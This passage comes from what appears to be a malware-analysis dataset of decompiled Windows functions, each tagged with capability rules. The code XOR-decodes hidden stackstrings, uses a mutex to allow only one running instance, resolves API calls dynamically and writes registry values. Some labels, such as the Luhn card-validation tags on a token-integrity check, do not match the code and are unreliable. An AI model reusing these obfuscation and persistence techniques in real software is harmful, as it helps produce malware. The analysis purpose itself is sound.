L\"\\\"%s\\\"\", lpString2);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                iVar4 = 8;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_10h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_7dh._0_1_ = 6;\n                    var_80h = 0x1532;\n                    var_7eh = 0x27;\n                    stack0xffffff80 = 0x7e413119;\n                    stack0xffffff85 = 0x73127e50;\n                    var_73h = 0x44731859;\n                    var_6fh = 0x597d4576;\n                    var_6bh = 0x7d01765b;\n                    var_67h._0_1_ = 0x59;\n                    var_14h = 5;\n                    var_67h._1_1_ = 5;\n                    stack0xffffff97 = 0x76501836;\n                    var_61h = 0x7a796244;\n                    var_5dh = 0x1173073a;\n                    var_59h._0_1_ = 8;\n                    stack0xffffffa4 = 0x5427123a;\n                    var_54h = 0x73507655;\n                    var_50h = 0xe271f13;\n                    var_4ch._0_2_ = 0x5173;\n                    stack0xffffffb3 = 0x11376b5e;\n                    var_45h = 0x7644731c;\n                    var_41h = 0x61597d44;\n                    var_24h = 0x74536153;\n                    var_20h._0_2_ = CONCAT11(var_20h._1_1_, 0x70);\n                    var_78h._0_1_ = var_7dh;\n                    var_4ch._2_1_ = var_67h._1_1_;\n                    uVar1 = (*pcVar5)(8, 0x44);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar4 = 0;\n                    var_18h = &var_80h - iVar3;\n                    do {\n                        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n                        if (iVar2 != 0x3c4635) {\n                            *(iVar4 + iVar3) = *(&var_24h + iVar4 % var_14h) ^ (iVar4 + iVar3)[&var_80h - iVar3];\n                        }\n                        iVar4 = iVar4 + 1;\n                    } while (iVar4 < 0x43);\n                    uVar1 = var_10h;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar3, var_10h, var_10h);\n                    iVar4 = fcn.0040dfbd(nNumberOfBytesToWrite);\n                    iVar2 = var_1ch;\n                    if (iVar4 == 0) {\n                        iVar4 = fcn.004099e8(uVar1);\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar5)(0, hHeap);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar2);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar2 = var_8h;\n            }\n            uVar1 = (*pcVar5)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar4;\n}\n",
        "token_count": 1781
    },
    "0040ca42": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040ca42(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x2b0c1450;\n    var_14h = 0x2035e3e;\n    var_10h = 0x95f3a24;\n    var_ch._0_1_ = 0x6d;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x486d6633;\n    var_4h._0_1_ = 0x55;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar2 != 0x9459b8) {\n            var_1ch = 5;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 5) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.004041de();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 588
    },
    "0040e82f": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e82f(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x4a1d4937;\n    var_38h = 0x4912343a;\n    var_34h = 0x342b4a11;\n    var_30h = 0x4a3d4901;\n    var_2ch = 0x49103426;\n    var_28h = 0x34314a0a;\n    var_24h = 0x4a174934;\n    var_20h = 0x490a3421;\n    var_1ch = 0x341c4a0c;\n    var_18h = 0x4a0a490c;\n    var_14h = 0x4905342d;\n    var_10h = 0x34484a1c;\n    var_ch = 0x4a784964;\n    var_8h._0_2_ = 0x3448;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar4 = 0;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar3 != 0xe4314b) {\n            var_4h = 6;\n            *(iVar4 + iVar2) = *(&var_ch + iVar4 % 6) ^ (iVar4 + iVar2)[&var_3ch - iVar2];\n        }\n        iVar4 = iVar4 + 1;\n    } while (iVar4 < 0x30);\n    iVar4 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar2);\n    if (iVar4 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar2);\n    }\n    else {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return;\n}\n",
        "token_count": 661
    },
    "0040e927": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040e927(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (var_4h != NULL) {\n        var_2ch = 0x23101c5e;\n        var_28h = 0x504a5950;\n        puVar8 = var_4h;\n        for (iVar6 = 0x1c; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_24h = 0x15595163;\n        var_20h._0_1_ = 0x62;\n        var_1ch = 0x4d627935;\n        var_18h._0_1_ = 0x35;\n        uVar2 = (*pcVar5)(8, 0xe);\n        iVar6 = (*pcVar1)(uVar2);\n        var_8h = 5;\n        iVar7 = 0;\n        lpModuleName = iVar6;\n        do {\n            iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            if (iVar3 != 0x2d0487) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        var_2ch = 0x181a5e02;\n        var_28h = 0x395b353f;\n        var_24h = 0x4e262f19;\n        var_20h._0_1_ = 0x68;\n        var_1ch = 0x6c683754;\n        var_18h._0_1_ = 0x4a;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar7 = 0;\n        var_10h = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n            iVar3 = lpModuleName;\n            if (iVar4 != 0x14293b) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_8h) ^ (iVar7 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar6);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (pcVar5 != NULL) {\n            (*pcVar5)(fcn.0040e927, var_4h, 0x1c);\n            var_ch = *(var_4h + 4);\n        }\n        uVar2 = (*pcVar1)(0, var_4h);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*pcVar1)(uVar2);\n        uVar2 = (*pcVar5)(0, iVar3);\n        (*pcVar1)(uVar2);\n    }\n    return var_ch;\n}\n",
        "token_count": 1056
    },
    "0040f8d1": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "set registry value"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040f8d1(void)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint var_bch;\n    uint var_b8h;\n    int16_t *var_b4h;\n    int16_t *var_b0h;\n    int32_t var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9bh;\n    uint var_97h;\n    uint var_93h;\n    uint var_8fh;\n    uint var_8bh;\n    uint var_87h;\n    uint var_83h;\n    uint var_7fh;\n    uint var_7bh;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    int32_t var_49h;\n    int32_t var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    int32_t hKey;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint8_t var_10h;\n    uint var_fh;\n    uchar var_bh;\n    uchar uStack14;\n    uchar var_9h;\n    int16_t *var_8h;\n    uint var_4h;\n    \n    var_bch = 1;\n    var_34h = 0x6e527214;\n    var_30h = 0x3713503f;\n    var_2ch = 0x723c591b;\n    var_28h = 0x50106e43;\n    var_24h = 0x591d371c;\n    var_20h = 0x6e567224;\n    var_1ch._0_1_ = 0x35;\n    var_1ch._1_2_ = 0x1e50;\n    var_1ch._3_1_ = 0x37;\n    var_18h._0_2_ = 0x596e;\n    var_44h = 0x6e377250;\n    var_40h._0_1_ = 0x59;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x3d);\n    piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    hKey = 5;\n    var_b8h = 0;\n    iVar8 = 0;\n    var_b0h = piVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        if (iVar5 != 0x9fa07) {\n            *(iVar8 + piVar4) = *(&var_44h + iVar8 % hKey) ^ (iVar8 + piVar4)[&var_34h - piVar4];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 0x1e);\n    var_a0h._0_1_ = 5;\n    var_a8h = 0x72165a63;\n    var_a4h = 0x792e3022;\n    stack0xffffff5d = 0xb5a5144;\n    var_9bh._0_2_ = 0x2172;\n    var_9bh._2_1_ = 0x30;\n    var_ach = 6;\n    var_9bh._3_1_ = 6;\n    var_97h = 0x59443f79;\n    var_93h = 0x36721a5a;\n    var_8fh = 0x1793530;\n    var_8bh = 0x1f5a5f44;\n    var_87h._0_2_ = 0x3072;\n    var_87h._2_1_ = 0x30;\n    var_83h = 0x75443b79;\n    var_7fh = 0xf72385a;\n    var_7bh._0_1_ = 0x30;\n    stack0xffffff83 = 0x42443579;\n    var_75h = 0x3172165a;\n    var_71h = 0x22792a30;\n    var_6dh = 0x155a5f44;\n    var_69h = 0x39302d72;\n    var_65h = 0x6c440b79;\n    var_61h = 0x2172295a;\n    var_5dh = 0x16793430;\n    var_59h = 0x175a5944;\n    var_55h = 0x1d302372;\n    var_51h = 0x7f442279;\n    var_4dh = 0x44720a5a;\n    var_49h._0_1_ = 0x30;\n    var_8h = 0x72795a30;\n    var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x44);\n    var_87h._3_1_ = var_9bh._3_1_;\n    var_7bh._1_1_ = var_9bh._3_1_;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc1);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_44h = iVar8;\n    var_3ch = &var_a8h - iVar8;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n        if (iVar6 != 0xc66f9d) {\n            *(iVar5 + iVar8) = *(&var_8h + iVar5 % hKey) ^ (iVar5 + iVar8)[&var_a8h - iVar8];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x60);\n    hKey = fcn.00404862(0x20006);\n    pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (hKey != 0) {\n        var_14h._0_1_ = 5;\n        stack0xffffffe9 = 0x276c044d;\n        var_fh = 0x1f4d2875;\n        var_bh = 0x6c;\n        uStack14 = 0x52;\n        var_9h = 0x75;\n        var_8h = 0x6c6b4d46;\n        var_4h._0_2_ = 0x7552;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        unique0x100003a2 = &var_14h - iVar8;\n        var_3ch = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetOpenClipboardWindow)();\n            if (iVar6 != 0xe5718) {\n                *(iVar5 + iVar8) = *(&var_8h + iVar5 % var_ach) ^ (iVar5 + iVar8)[&var_14h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_24h = 0x4c274918;\n        var_20h = 0x49205205;\n        var_1ch._0_1_ = 0x77;\n        var_1ch._1_2_ = 0x714c;\n        var_1ch._3_1_ = 0x52;\n        stack0xffffffe9 = stack0xffffffe9 & 0xffffff | 0x48000000;\n        var_fh = 0x714c4649;\n        var_bh = 0x52;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        unique0x1000039e = &var_24h - iVar8;\n        var_8h = iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n            if (iVar6 != 0x6f5de0) {\n                *(iVar5 + iVar8) = (&var_10h)[iVar5 % var_ach] ^ (iVar5 + iVar8)[&var_24h - iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0xc);\n        var_28h = 0x572c793a;\n        var_24h = 0x791d3217;\n        var_20h = 0x321b5720;\n        var_1ch._0_1_ = 7;\n        var_1ch._1_2_ = 0x7879;\n        var_1ch._3_1_ = 0x57;\n        var_18h._0_2_ = 0x3274;\n        stack0xffffffe9 = stack0xffffffe9 & 0xffffff | 0x69000000;\n        var_fh = 0x74574979;\n        var_bh = 0x32;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n        iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        unique0x1000039a = &var_28h - iVar8;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetShellWindow)();\n            if (iVar6 != 0x14e699) {\n                *(iVar5 + iVar8) = (&var_10h)[iVar5 % var_ach] ^ (iVar5 + iVar8)[&var_28h - iVar8];\n            }\n            pcVar7 = _sym.imp.ADVAPI32.dll_RegSetValueExW;\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x12);\n        (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, var_3ch, 0, 4, &var_bch, 4);\n        iVar5 = var_8h;\n        piVar4 = var_b4h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, var_8h, 0, 1, var_b4h, (piVar4 - (var_b4h + 1) >> 1) * 2);\n        var_8h = var_b0h + 1;\n        piVar4 = var_b0h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != var_b8h);\n        (*pcVar7)(hKey, iVar8, 0, 1, var_b0h, (piVar4 - var_8h >> 1) * 2);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        pcVar7 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar7)(0, iVar5);\n        (*pcVar2)(uVar3);\n        uVar3 = (*pcVar7)(0, var_3ch);\n        (*pcVar2)(uVar3);\n        iVar8 = var_44h;\n    }\n    piVar4 = var_b0h;\n    uVar3 = (*pcVar7)(0, iVar8);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar7)(0, piVar4);\n    (*pcVar2)(uVar3);\n    return 1;\n}\n",
        "token_count": 2924
    },
    "0040fe86": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040fe86(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint extraout_ECX;\n    int32_t iVar7;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar *pszFirst;\n    int32_t var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0;\n    pszFirst = puVar4;\n    fcn.00401374();\n    if (puVar4 == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_7ch = 0x44787016;\n        var_78h = 0x3920331c;\n        var_74h = 0x70724c00;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_70h = 0x330d446d;\n        var_6ch = 0x4c183955;\n        var_68h = 0x4450707e;\n        var_64h = 0x3902332f;\n        var_60h = 0x70404c2b;\n        var_5ch = 0x332a4456;\n        var_58h = 0x4c183904;\n        var_54h = 0x4457707a;\n        var_50h = 0x39153338;\n        var_4ch = 0x705d4c36;\n        var_48h = 0x3338445c;\n        var_44h = 0x4c013950;\n        var_40h = 0x4449704b;\n        var_3ch = 0x391f3320;\n        var_38h._0_2_ = 0x4c36;\n        var_38h._2_1_ = 0x56;\n        stack0xffffffc7 = 0x10444b70;\n        var_34h._3_1_ = 0x33;\n        var_30h._0_2_ = 0x3970;\n        var_1ch = 0x44397033;\n        var_18h._0_1_ = 0x4c;\n        uVar3 = (*pcVar1)(8, 0x9d);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        var_4h = 5;\n        iVar7 = 0;\n        var_ch = iVar6;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar5 != 0x51681f) {\n                *(iVar7 + iVar6) = *(&var_1ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_7ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n        var_4ch = 0x7a105540;\n        var_48h = 0x6921331b;\n        var_44h = 0x555e681f;\n        var_40h = 0x331a7a19;\n        var_3ch = 0x681c693a;\n        var_38h._0_2_ = 0x555a;\n        var_38h._2_1_ = 5;\n        stack0xffffffc7 = 0x55330d7a;\n        var_34h._3_1_ = 0x69;\n        var_2ch = 0x7a695533;\n        var_28h._0_1_ = 0x68;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_1ch = iVar6;\n        var_14h = &var_4ch - iVar6;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            puVar4 = pszFirst;\n            if (iVar5 != 0xe3277e) {\n                *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_4ch - iVar6];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x1c);\n        iVar7 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar6);\n        if (iVar7 != 0) {\n            var_58h = 0x741b4a43;\n            var_54h = 0x4839662f;\n            var_50h = 0x4a035600;\n            var_4ch = 0x66047425;\n            var_48h = 0x561b4825;\n            var_44h = 0x746d4a12;\n            var_40h = 0x481e660a;\n            var_3ch = 0x4a155615;\n            var_38h._0_2_ = 0x7423;\n            var_38h._2_1_ = 0x25;\n            stack0xffffffc7 = 0x74481666;\n            var_34h._3_1_ = 0x56;\n            var_2ch = 0x74484a66;\n            var_28h._0_1_ = 0x56;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar7 = 0;\n            var_14h = &var_58h - iVar6;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetFocus)();\n                puVar4 = pszFirst;\n                if (iVar5 != 0xb2cbbc) {\n                    *(iVar7 + iVar6) = *(&var_2ch + iVar7 % var_4h) ^ (iVar7 + iVar6)[&var_58h - iVar6];\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar6, pszFirst, 0x104);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar6 = var_1ch;\n        }\n        iVar7 = var_ch;\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41dd7c);\n        uVar3 = extraout_ECX;\n        iVar5 = fcn.0040dfbd(var_20h);\n        if (iVar5 == 0) {\n            fcn.004099e8(uVar3);\n            fcn.0040db6f();\n            var_10h = fcn.0040fd3d();\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar6);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar7);\n        (*pcVar1)(uVar3);\n    }\n    return var_10h;\n}\n",
        "token_count": 2092
    },
    "00401587": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00401587(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 519
    },
    "0040282b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040282b(void)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(*0x41da98);\n    iVar4 = fcn.004012fd();\n    iVar7 = -0x43ec94ba;\n    var_28h = 0xd84a20ac;\n    iVar6 = 0;\n    var_24h = 0xeed889c4;\n    var_20h = 0x58636143;\n    piVar1 = piVar3 + 1;\n    var_1ch = 0xc0f26006;\n    var_18h = 0x8606bedd;\n    var_14h = 0xe8cbab78;\n    var_10h = 0x2ab6e04a;\n    var_ch = 0x31e6d1ea;\n    var_8h = 0;\n    do {\n        iVar2 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar2 != 0);\n    if (piVar3 - piVar1 